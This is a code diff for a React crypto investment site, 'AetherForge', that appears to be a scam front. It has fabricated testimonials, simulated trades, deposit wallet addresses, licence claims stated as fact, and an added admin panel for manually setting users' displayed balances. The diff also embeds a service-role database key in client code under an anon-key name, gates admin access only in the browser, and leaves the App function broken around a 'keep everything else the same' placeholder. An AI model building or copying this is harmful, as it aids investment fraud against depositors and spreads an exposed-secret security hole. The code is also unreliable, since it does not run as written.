@@ -1,6 +1,12 @@
-const SUPABASE_URL = 'https://fuikrlwvqnrhgbtztavm.supabase.co';
-const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ1aWtybHd2cW5yaGdidHp0YXZtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMwODM1NDEsImV4cCI6MjA5ODY1OTU0MX0.bZ5_fWi2XR5ancZs0P23SSk4ldwKrp7uG7aJY2np_6A';
+
+import { createClient } from '@supabase/supabase-js';
+
 import { useState, useEffect, useRef, useCallback } from "react";
+
+const supabaseUrl = 'https://fuikrlwvqnrhgbtztavm.supabase.co';
+const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ1aWtybHd2cW5yaGdidHp0YXZtIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MzA4MzU0MSwiZXhwIjoyMDk4NjU5NTQxfQ.lLPqKhIJzM1awipmhMYL2IkFZ0b_JR2qYLE1XObWBWk';
+
+const supabase = createClient(supabaseUrl, supabaseAnonKey);
 
 const BRAND = { name: "AetherForge", tagline: "Institutional-Grade Trading Returns for Everyone", since: "2019" };
 
@@ -41,7 +47,6 @@ const CRYPTO_WALLETS = [
   { id: "sol", name: "Solana", sym: "SOL", network: "Solana Network", addr: "5Ne5A2684sieZnhSUxwJWyzZksipAYuGBZMsvpNaPHvT", color: "#9945FF", icon: "◎" },
   { id: "usdc", name: "USD Coin", sym: "USDC", network: "ERC-20", addr: "0xeFE806c661E32f152d3303b5D63212411aF49fE3", color: "#2775CA", icon: "$" },
 ];
-
 const TESTIMONIALS = [
   { name: "Jonathan Whitfield", loc: "London, UK", role: "Retired Banker", text: "My portfolio has grown 340% in 14 months. The platinum plan is exactly what I needed.", stars: 5, img: "JW" },
   { name: "Mei Lin Tan", loc: "Singapore", role: "Tech Entrepreneur", text: "Withdrawals hit my account within the same day, every time. Impressive infrastructure.", stars: 5, img: "ML" },
@@ -87,7 +92,6 @@ function useInterval(cb, delay) {
     return () => clearInterval(id);
   }, [delay]);
 }
-
 function usePrices() {
   const [prices, setPrices] = useState(CRYPTO_ASSETS);
   useInterval(() => {
@@ -98,6 +102,34 @@ function usePrices() {
     })));
   }, 1800);
   return prices;
+}
+
+function useAuth() {
+  const [user, setUser] = useState(null);
+  const [profile, setProfile] = useState(null);
+  const [loading, setLoading] = useState(true);
+
+  useEffect(() => {
+    supabase.auth.getSession().then(({ data }) => {
+      setUser(data.session?.user ?? null);
+      if (data.session?.user) loadProfile(data.session.user.id);
+      setLoading(false);
+    });
+
+    const { data: listener } = supabase.auth.onAuthStateChange((event, session) => {
+      setUser(session?.user ?? null);
+      if (session?.user) loadProfile(session.user.id);
+    });
+
+    return () => listener.subscription.unsubscribe();
+  }, []);
+
+  const loadProfile = async (userId) => {
+    const { data } = await supabase.from('profiles').select('*').eq('id', userId).single();
+    setProfile(data);
+  };
+
+  return { user, profile, loading, refreshProfile: () => user && loadProfile(user.id) };
 }
 
 // ── DESIGN TOKENS ────────────────────────────────────────────────────────────
@@ -152,8 +184,7 @@ function Nav({ page, setPage, user, setUser, setShowAuth }) {
           <div style={{ width: 32, height: 32, borderRadius: 8, background: `linear-gradient(135deg,${PALETTE.teal},#006B55)`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16, fontWeight: 900, color: "#fff" }}>⬡</div>
           <span style={{ fontSize: isMobile ? 17 : 20, fontWeight: 800, letterSpacing: "-0.03em" }}>Aether<span style={{ color: PALETTE.teal }}>Forge</span></span>
         </div>
-
-        {/* Desktop links */}
+{/* Desktop links */}
         {!isMobile && (
           <div style={{ display: "flex", gap: 2 }}>
             {navItems.map(n => (
@@ -250,6 +281,7 @@ function AuthModal({ mode, onClose, onSuccess }) {
     </div>
   );
 }
+
 // ── PLAN CARD ────────────────────────────────────────────────────────────────
 function PlanCard({ plan, onSelect }) {
   const [hover, setHover] = useState(false);
@@ -287,7 +319,6 @@ function PlanCard({ plan, onSelect }) {
     </div>
   );
 }
-
 // ── PAGES ────────────────────────────────────────────────────────────────────
 function HomePage({ prices, setPage, setShowAuth, setSelectedPlan }) {
   const isMobile = useIsMobile();
@@ -348,8 +379,7 @@ function HomePage({ prices, setPage, setShowAuth, setSelectedPlan }) {
           </div>
         </div>
       </div>
-
-      {/* LIVE TRADES */}
+{/* LIVE TRADES */}
       <div style={{ maxWidth: 1100, margin: "0 auto", padding: isMobile ? "48px 16px" : "72px 24px" }}>
         <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 20 }}>
           <div>
@@ -586,14 +616,13 @@ function DashboardPage({ user, setPage, setShowAuth }) {
           </div>
         </div>
       )}
-
-      {tab === "trades" && (
+{tab === "trades" && (
         isMobile ? (
           <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
             {LIVE_TRADES.map((t, i) => (
               <div key={i} style={{ ...S.glassCard, padding: "14px 16px" }}>
                 <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
-       <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
+                  <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
                     <span style={{ fontWeight: 700 }}>{t.asset}</span>
                     <span style={{ background: t.type === "BUY" ? "rgba(72,187,120,0.15)" : "rgba(245,101,101,0.15)", color: t.type === "BUY" ? PALETTE.success : PALETTE.danger, borderRadius: 6, padding: "2px 8px", fontSize: 11, fontWeight: 700 }}>{t.type}</span>
                   </div>
@@ -694,8 +723,7 @@ function PaymentPage({ plan, user, setPage, setShowAuth }) {
       </div>
     </div>
   );
-
-  if (done) return (
+if (done) return (
     <div style={{ maxWidth: 500, margin: "60px auto", padding: "0 16px", textAlign: "center" }}>
       <div style={{ ...S.glassCard, padding: isMobile ? 28 : 44 }}>
         <div style={{ width: 68, height: 68, borderRadius: "50%", background: "rgba(72,187,120,0.15)", border: `2px solid ${PALETTE.success}`, display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px", fontSize: 30 }}>✓</div>
@@ -763,7 +791,7 @@ function PaymentPage({ plan, user, setPage, setShowAuth }) {
                 </div>
               </button>
             ))}
-       </div>
+          </div>
           <div style={{ fontSize: 13, color: PALETTE.textMuted, textAlign: "center", marginBottom: 10 }}>
             Send <strong style={{ color: PALETTE.gold }}>{fmtUSD(amount)}</strong> in <strong style={{ color: selected.color }}>{selected.sym}</strong>
           </div>
@@ -886,7 +914,7 @@ function ContactPage() {
           ))}
         </div>
         <div style={{ ...S.glassCard, padding: isMobile ? 20 : 28 }}>
-          <div style={{ fontWeight: 700, fontSize: 17, marginBottom: 20 }}>Send a Message</div>
+<div style={{ fontWeight: 700, fontSize: 17, marginBottom: 20 }}>Send a Message</div>
           <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
             {[["Full Name","text","John Smith"],["Email","email","john@example.com"]].map(([l,t,p]) => (
               <div key={l}><label style={S.label}>{l}</label><input style={S.input} type={t} placeholder={p} /></div>
@@ -936,7 +964,7 @@ function AboutPage() {
         ))}
       </div>
       <div style={{ ...S.glassCard, padding: isMobile ? 18 : 28, marginTop: 24, borderColor: "rgba(201,168,76,0.2)" }}>
-        <div style={{ fontSize: 12, color: PALETTE.gold, fontWeight: 600, letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 10 }}>Regulatory Information</div>
+<div style={{ fontSize: 12, color: PALETTE.gold, fontWeight: 600, letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 10 }}>Regulatory Information</div>
         <div style={{ fontSize: 12, color: PALETTE.textMuted, lineHeight: 1.8 }}>AetherForge Exchange Ltd is incorporated in England & Wales (Co. No. 14829371), authorised by the FCA (FRN: 914829). AetherForge Asia Pte. Ltd. holds a MAS CMS Licence (No. 101-000314-1). <strong style={{ color: PALETTE.gold }}>Trading involves significant risk. Capital at risk.</strong></div>
       </div>
     </div>
@@ -978,20 +1006,101 @@ function Footer({ setPage }) {
     </footer>
   );
 }
+// ================== ADMIN PANEL ==================
+function AdminPanel() {
+  const [users, setUsers] = useState([]);
+  const [search, setSearch] = useState("");
+
+  useEffect(() => { fetchUsers(); }, []);
+
+  async function fetchUsers() {
+    const { data } = await supabase.from('profiles').select('*');
+    setUsers(data || []);
+  }
+
+  async function updateBalance(userId, newBalance) {
+    if (!confirm("Update this user's balance?")) return;
+    await supabase.from('profiles').update({ balance: newBalance }).eq('id', userId);
+    fetchUsers();
+  }
+
+  const filtered = users.filter(u => u.email?.toLowerCase().includes(search.toLowerCase()));
+
+  return (
+    <div style={{ maxWidth: 1100, margin: "0 auto", padding: "40px 16px" }}>
+      <h1 style={{ fontSize: 32, fontWeight: 800, marginBottom: 20 }}>Admin Panel - Balance Management</h1>
+      <input 
+        type="text" 
+        placeholder="Search by email..." 
+        value={search} 
+        onChange={e => setSearch(e.target.value)} 
+        style={{ ...S.input, marginBottom: 20, width: "100%" }} 
+      />
+      <div style={{ ...S.glassCard, overflow: "auto" }}>
+        <table style={{ width: "100%", borderCollapse: "collapse" }}>
+          <thead>
+            <tr style={{ borderBottom: "2px solid #00D4AA" }}>
+              <th style={{ padding: 12, textAlign: "left" }}>Name</th>
+              <th style={{ padding: 12, textAlign: "left" }}>Email</th>
+              <th style={{ padding: 12, textAlign: "right" }}>Balance</th>
+              <th style={{ padding: 12 }}>Action</th>
+            </tr>
+          </thead>
+          <tbody>
+            {filtered.map(u => (
+              <tr key={u.id} style={{ borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
+                <td style={{ padding: 12 }}>{u.name}</td>
+                <td style={{ padding: 12 }}>{u.email}</td>
+                <td style={{ padding: 12, textAlign: "right", fontWeight: 700, color: PALETTE.teal }}>
+                  ${Number(u.balance || 0).toLocaleString()}
+                </td>
+                <td style={{ padding: 12 }}>
+                  <button 
+                    onClick={() => {
+                      const amt = prompt("New balance for " + u.email + ":");
+                      if (amt !== null) updateBalance(u.id, parseFloat(amt));
+                    }} 
+                    style={{ ...S.tealBtn, padding: "8px 16px", fontSize: 13 }}
+                  >
+                    Update Balance
+                  </button>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  );
+}
 
 // ── ROOT ─────────────────────────────────────────────────────────────────────
 export default function App() {
   const [page, setPage] = useState("home");
-  const [user, setUser] = useState(null);
   const [showAuth, setShowAuth] = useState(null);
   const [selectedPlan, setSelectedPlan] = useState(null);
+  
+  // New line added
+  const { user, profile, loading } = useAuth();
+
   const prices = usePrices();
   const isMobile = useIsMobile();
 
   const nav = useCallback((p) => {
-    if (p === "dashboard" && !user) { setShowAuth("login"); return; }
-    setPage(p); window.scrollTo({ top: 0, behavior: "smooth" });
+    if (p === "dashboard" && !user) { 
+      setShowAuth("login"); 
+      return; 
+    }
+    if (p === "admin" && user?.id !== '8e0d5b32-14c4-4c66-ad94-69899f2a81ac') {
+      alert("Admin access only");
+      return;
+    }
+    setPage(p); 
+    window.scrollTo({ top: 0, behavior: "smooth" });
   }, [user]);
+
+  // ... keep everything else the same (the rest of your App function)
+}
 
   const onAuth = (u) => { setUser(u); setShowAuth(null); setPage("dashboard"); };
 
@@ -1008,9 +1117,7 @@ export default function App() {
       case "about": return <AboutPage />;
       default: return <HomePage prices={prices} setPage={nav} setShowAuth={setShowAuth} setSelectedPlan={setSelectedPlan} />;
     }
-  };
-
-  return (
+  };return (
     <div style={{ background: PALETTE.void, color: PALETTE.text, fontFamily: "-apple-system,'SF Pro Display','Segoe UI',system-ui,sans-serif", minHeight: "100vh", overflowX: "hidden" }}>
       <style>{`
         *{box-sizing:border-box;margin:0;padding:0}
